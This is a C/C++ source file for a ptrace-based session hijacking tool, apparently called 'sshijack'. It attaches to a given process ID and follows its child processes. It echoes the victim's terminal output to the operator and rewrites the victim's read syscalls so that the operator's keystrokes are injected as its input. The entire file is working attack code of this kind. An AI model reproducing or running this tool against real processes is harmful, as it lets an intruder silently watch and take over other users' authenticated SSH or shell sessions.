#include <stdio.h>
#include <stdlib.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/syscall.h>
#include <sys/user.h>
#include <asm/ptrace.h>
#include <errno.h>
#include <queue>
#include <map>
#include <signal.h>
#include <string.h>

#include <pthread.h>
#include <time.h>
//TODO: Clean up this code!

#include "sshijack.h"
#include "terminal.h"
#include "syscallToStr.h"

int wantToExit = 0;
void tryDetachFromProcesses();
void signal_sigint(int sig)
{
	printf("Caught Ctrl+C, exiting... Press a second time to force.\n");

	//(void) signal(SIGINT, SIG_DFL);
	struct sigaction sa;
	memset(&sa, 0, sizeof(struct sigaction));
	sa.sa_handler = SIG_DFL;
	sa.sa_flags = SA_RESTART;

	sigaction(SIGINT, &sa, NULL);

	tryDetachFromProcesses();
}

void setSignalHandlers()
{
	struct sigaction sa;
	memset(&sa, 0, sizeof(struct sigaction));
	
	sa.sa_handler = signal_sigint;
	sa.sa_flags = SA_RESTART;
	
	sigaction(SIGINT, &sa, NULL);
}

class buffer
{
//Disclaimer: This is not supposed to be optimal
//This is supposed to *work*
private:
	queue<unsigned char> data;
	pthread_mutex_t mutex;
public:
	buffer()
	{
		pthread_mutex_init(&mutex, NULL);
	}

	void lock()
	{
		pthread_mutex_lock(&mutex);
	}

	void unlock()
	{
		pthread_mutex_unlock(&mutex);
	}

	void add(char c) {data.push(c);}
	void add(const char *s)
	{
		for(const char *p = s; *p; p++)
			data.push(*p);
	}

	void lockedAdd(char c)
	{
		lock();
		add(c);
		unlock();
	}

	void lockedAdd(const char *s)
	{
		lock();
		add(s);
		unlock();
	}

	int lockedSize()
	{
		lock();
		int retval = data.size();
		unlock();
		return retval;
	}

	unsigned char get()
	{
		unsigned char c = data.front();
		data.pop();
		return c;
	}

	unsigned char lockedGet()
	{
		lock();
		unsigned char retval = get();
		unlock();
		return retval;
	}
};

buffer inputBuffer;

inline unsigned long getValue(unsigned long addr, pid_t tracepid)
{
	unsigned long retval = ptrace(PTRACE_PEEKDATA,tracepid,addr,0);
	if(retval == (unsigned long)-1 && errno != 0)
	{
		perror("ptrace read");
		printf("errno: %d\n", errno);
	}
	//throw "Exception!!!";
	return retval;
}

inline long writeLong(unsigned long addr, unsigned long value, pid_t tracepid)
{
	long retval = ptrace(PTRACE_POKEDATA,tracepid,addr, value);
	if(retval == -1)
	{
		char tmp[100];
		sprintf(tmp, "ptrace write at addr 0x%lx", addr);
		perror(tmp);
	}
	else
		dprintf("Write OK!\n");
	return retval;
}

inline int writeChar(unsigned long addr, unsigned char value, pid_t tracepid)
{
	//TODO: Check retval + errno!
	unsigned long origVal = getValue(addr, tracepid);
	unsigned char *p = (unsigned char *)&origVal;
	*p = value;
	writeLong(addr, origVal, tracepid);
	
	return -1; // In case I forget about the TODO
}

class processInfo
{
	public:
	processInfo(pid_t newPid)
	{
		pid = newPid;
		inSyscall = 0;
		fakingSyscall = -1;
		
		sigstopToDetach = 0;
		sigstopToRestartSyscall = 0;
		sigstopNewChild = 0;
	}

	pid_t pid;
	int inSyscall;
	int fakingSyscall;
	
	int sigstopToDetach;
	int sigstopToRestartSyscall;
	int sigstopNewChild;
};

typedef map<pid_t, processInfo*> processes_t;
processes_t processes;

void *stdinPoll(void *inBuf)
{
	buffer *inputBuffer = (buffer *)inBuf;
	initTerminal();
	while(!wantToExit)
	{
		int c = getTerminalChar();
		if(c != -1)
		{
			// Lock the buffer and read as much data as you can (useful with
			// special sequences of more than one character)
			inputBuffer->lock();
			do
			{
				inputBuffer->add(c);
				c = getTerminalChar();
			}
			while(c != -1);
			inputBuffer->unlock();
			
			// TODO: Clean up this mess! Possibly move to a separate function
			// Wake up reading processes
			foreach(processes, it)
			{
				if(it->second->inSyscall && it->second->fakingSyscall == -1)
				{
					//TODO: if possible, check if the syscall is sys_read
					it->second->sigstopToRestartSyscall = 1;
					int retval = kill(it->second->pid, SIGSTOP);
					if(retval)
					{
						printf("Error while sending SIGSTOP to %d\n", it->second->pid);
						perror("Error");
					}
				}
			}
		}
		//thread_sleep(10);
		struct timespec waitTime;
		waitTime.tv_sec = 0;
		waitTime.tv_nsec = 100000000; // 0.1 sec
		nanosleep(&waitTime, NULL);
	}
	uninitTerminal();
	
	return NULL;
}

// ============= HOOKS =============
void readHook(pid_t pid, user_regs_struct &regs)
{
	//ssize_t read(int fd, void *buf, size_t count);
	//eax read(ebx fd, ecx *buf, edx count);
	unsigned int len = inputBuffer.lockedSize();
	if(regs.ARG3 < len)
		len = regs.ARG3;
	
	inputBuffer.lock();
	for(unsigned int i = 0; i < len; i++)
	{
		char c = inputBuffer.get();
		writeChar(regs.ARG2 + i, c, pid);
	}
	inputBuffer.unlock();
	regs.RAX = len;
}

void writeHook(pid_t pid, user_regs_struct &regs)
{
	// ssize_t write(int fd, const void *buf, size_t count);
	//ssize_t retval = write(regs.ARG1, regs.ARG2, regs.ARG3);
	//write(stdout, regs.ARG2, regs.ARG3);
	dprintf("fd = %d\n", (int)regs.ARG1);
	if(regs.ARG1 == 1 /*stdout*/ || regs.ARG1 == 2 /*stderr*/ )
	{
		for(unsigned int i = 0; i < regs.ARG3; i++)
		{
			unsigned long c = getValue(regs.ARG2 + i, pid);
			dprintf("Wrote letter: ");
			printf("%c", (int)c);
			dprintf("\n");
		}
		fflush(stdout);
	}
	
	//return retval;
}

// ======== END OF HOOKS ===========

void processSyscall(processInfo *pi, user_regs_struct *regs, int *saveRegs)
{
	// regs->ORIG_RAX - Syscall number
	//printf("__RAX: %ld (orig: %ld)\n", regs->RAX, regs->ORIG_RAX);
	if(!pi->inSyscall)
	{
		dprintf("[%d] Entering syscall: %s (%ld), rax = %ld\n",
				pi->pid, syscallToStr(regs->ORIG_RAX), regs->ORIG_RAX, regs->RAX);
		if(inputBuffer.lockedSize() && regs->ORIG_RAX == SYS_read && regs->ARG1 == 0)
		{
			dprintf("Syscall: 0x%lx\tfd: 0x%lx\tbuf: 0x%lx\tcount: 0x%lx\n", regs->ORIG_RAX, regs->ARG1, regs->ARG2, regs->ARG3);

			//TODO: check whether fd == 0 (input)
			// First ptrace trap. We are about to run a syscall.
			// Remember it and change it to a nonexisting one
			// Then wait for ptrace to stop execution again after
			// running it.
			pi->fakingSyscall = regs->ORIG_RAX;

			// This syscall can't exist :)
			regs->ORIG_RAX = (unsigned int)-1;
			regs->RAX = -1;

			*saveRegs = 1;
		}
		
		if(regs->ORIG_RAX == SYS_write)
		{
			dprintf("Got a write syscall!\n");
			writeHook(pi->pid, *regs);
		}
		
		
		pi->inSyscall = 1;
	}
	else // Exiting from a syscall
	{
		dprintf("[%d] Exiting syscall:  %s (%ld)   with code %ld\n",
				pi->pid, syscallToStr(regs->ORIG_RAX), regs->ORIG_RAX, regs->RAX);
		if(pi->fakingSyscall != -1)
		{
			if(regs->ORIG_RAX != (unsigned int)-1)
				printf("[%d] OMG! :O, regs->ORIG_RAX == %ld\n", pi->pid, regs->ORIG_RAX);
			dprintf("[%d] Trying to write something.\n", pi->pid);
			// Second ptrace trap. We just finished running our
			// nonexisting syscall. Now is the moment to inject the
			// "correct" return values, etc...
			switch(pi->fakingSyscall)
			{
			case SYS_read: readHook(pi->pid, *regs); break;
				
			}

			*saveRegs = 1;
			pi->fakingSyscall = -1;
		}
		
		pi->inSyscall = 0;
	}
}

void detachProcess(pid_t pid)
{
	printf("Detaching %d... ", pid);
	int retval = ptrace(PTRACE_DETACH, pid, NULL, NULL);
	if(retval == -1)
	{
		printf("Failed!\n");
		switch(errno)
		{
			case EBUSY: printf("EBUSY\n"); break;
			case EFAULT: printf("EFAULT\n"); break;
			case EIO: printf("EIO\n"); break;
			case EINVAL: printf("EINVAL\n"); break;
			case EPERM: printf("EPERM\n"); break;
			case ESRCH: printf("ESRCH\n"); break;
			default: printf("Reason: Other\n");
		}
		perror("Detach failed");
	}
	else
	{
		printf("OK!\n");
	}
}

void tryDetachFromProcesses()
{
	wantToExit = 1;
	
	printf("Trying to detach...\n");
	foreach(processes, it)
	//for(map<pid_t, processInfo*>::iterator it = processes.begin(); it != processes.end(); it++)
	{
		processInfo *pi = it->second;
		printf("Trying send SIGSTOP to pid %d... ", pi->pid);
		
		// If we're in the middle of faking a system call, we can't detach from this pid
		if(pi->inSyscall && pi->fakingSyscall != -1)
		{
			printf("faking system call. Aborted.\n");
			continue;
		}
		
		pi->sigstopToDetach = 1;
		int retval = kill(pi->pid, SIGSTOP);
		if(retval)
		{
			printf("Error while sending SIGSTOP to %d\n", pi->pid);
			perror("Error");
		}
		printf("\n");
	}
}

int main(int argc, char *argv[])
{
	pthread_t pollStdinThread;
	setSignalHandlers();

	//inputBuffer.lockedAdd("To jest test\n");
	//inputBuffer.lockedAdd("Ab");

	if(argc < 2)
		pexit("Usage: %s <pid>\n", argv[0]);

	int firstPid = atoi(argv[1]);
	if(firstPid <= 1)
		pexit("Can't get correct pid from arguments\n");

	printf("Attaching to pid: %d\n", firstPid);
	if(ptrace(PTRACE_ATTACH, firstPid, NULL, NULL) == -1)
		perrorexit("PTRACE_ATTACH");

	processes[firstPid] = new processInfo(firstPid);

	int status;
	// Should be checked
	firstPid = wait(&status);
	if(WIFEXITED(status))
	{
		printf("Process %d exited\n", firstPid);
		return 0;
	}
	
	if(ptrace(PTRACE_SETOPTIONS, firstPid, NULL,
		PTRACE_O_TRACEFORK | PTRACE_O_TRACEVFORK | PTRACE_O_TRACECLONE | PTRACE_O_TRACEEXEC
		/*| PTRACE_O_TRACESYSGOOD ? */) == -1)
		perrorexit("PTRACE_SETOPTIONS");

	int retval = pthread_create(&pollStdinThread, NULL, stdinPoll, (void*)&inputBuffer);

	// We are interested only in syscalls
	if(ptrace(PTRACE_SYSCALL, firstPid, NULL, NULL) == -1)
		perrorexit("PTRACE_SYSCALL");
	
	//=========================================================================
	while(1)
	{
		if(processes.empty())
		{
			// Got a better idea to break out of TWO while loops at once?
			goto noMoreProcesses;
		}
		
		// Wait for a syscall to be called
		int pidReceived = wait(&status);
		if(pidReceived == -1)
		{
			perror("wait");
			continue;
		}
		
		// pidReceived != -1, so get full info about this process
		processes_t::iterator it = processes.find(pidReceived);
		if(it == processes.end())
		{
			// On purpose. This may be a bug that should not get unnoticed!
			pexit("Unexpected pid %d received by wait call\n", pidReceived);
		}
		processInfo * pi = it->second;
		
		if(WIFEXITED(status) || WIFSIGNALED(status))
		{
			dprintf("Process %d exited\n", pidReceived);
			processes.erase(pidReceived);
			
			continue;
		} 
		
		if(WIFSTOPPED(status) && WSTOPSIG(status) == SIGSTOP)
		{
			dprintf("[%d] ******WIFSTOPPED!******\n", pi->pid);
			if(pi->sigstopToDetach)
			{
				// That's our chance! :)
				printf("Pid %d stopped while we wanted to quit. Trying to detach now...\n", pi->pid);
				detachProcess(pidReceived);
				processes.erase(pidReceived);
				continue;
			}
			
			if(pi->sigstopToRestartSyscall)
			{
				dprintf("Restarting tracing of pid %d\n", pi->pid);
				pi->sigstopToRestartSyscall = 0;
				
				if(ptrace(PTRACE_SYSCALL, pi->pid, NULL, NULL) == -1)
					perrorexit("PTRACE_SYSCALL");
				continue;
			}
			
			if(pi->sigstopNewChild)
			{
				pi->sigstopNewChild = 0;
				dprintf("[%d] The new child has stopped.\n", pi->pid);
				if(ptrace(PTRACE_SYSCALL, pi->pid, NULL, NULL) == -1)
					perrorexit("PTRACE_SYSCALL");
				continue;
			}
		}
		
		// If is't not our signal, forward it to the program and continue the loop
		if(WIFSTOPPED(status) && WSTOPSIG(status) != SIGTRAP)
		{
			dprintf("Pid %d stopped with signal: %d\n", pi->pid, WSTOPSIG(status));
		
			if(ptrace(PTRACE_SYSCALL, pi->pid, NULL, WSTOPSIG(status)) == -1)
				perrorexit("PTRACE_SYSCALL");
			continue;
		}
		
		// Check if we have got a new child
		// FIXME: Find a macro that returns the event
		int event = status >> 16;
		if(event == PTRACE_EVENT_FORK || event == PTRACE_EVENT_VFORK || event == PTRACE_EVENT_CLONE)
		{
			unsigned long newPid;
			if(ptrace(PTRACE_GETEVENTMSG, pi->pid, 0, &newPid) == -1)
				perrorexit("PTRACE_GETEVENTMSG");
			printf("A new process forked/vforked/cloned: %lu\n", newPid);
			processInfo *newPi = new processInfo(newPid);
			newPi->sigstopNewChild = 1;
			processes[newPid] = newPi;
			
			if(ptrace(PTRACE_SYSCALL, pi->pid, NULL, NULL) == -1)
				perrorexit("PTRACE_SYSCALL");
			
			continue;
		}
		if(event == PTRACE_EVENT_EXEC)
		{
			dprintf("###################################################################\n");
			dprintf("Wykryto exec!\n");
			dprintf("###################################################################\n");
			if(ptrace(PTRACE_SYSCALL, pi->pid, NULL, NULL) == -1)
				perrorexit("PTRACE_SYSCALL");
			
			continue;
		}
		
		//=Handle syscalls and registers=======================================
		struct user_regs_struct regs;
		// TODO: check retval
		if(ptrace((__ptrace_request)PTRACE_GETREGS, pi->pid, 0, &regs) == -1)
			perrorexit("PTRACE_GETREGS");
		
		int saveRegs = 0;
		processSyscall(pi, &regs, &saveRegs);
		if(saveRegs)
		{
			// TODO: check retval
			if(ptrace((__ptrace_request)PTRACE_SETREGS, pi->pid, 0, &regs) == -1)
				perrorexit("PTRACE_SETREGS");
		}
		//=====================================================================
		
		if(wantToExit && pi->inSyscall == 0 && pi->fakingSyscall != -1)
		{
			detachProcess(pi->pid);
			processes.erase(pi->pid);
			continue;
		}
		
		// We are interested only in syscalls
		if(ptrace(PTRACE_SYSCALL, pi->pid, NULL, NULL) == -1)
			perrorexit("PTRACE_SYSCALL");
	}
	// Yes, dear purists, that's a label. Kill me!
	noMoreProcesses:
	wantToExit = 1;
	pthread_join(pollStdinThread, NULL);
	
	return 0;
}

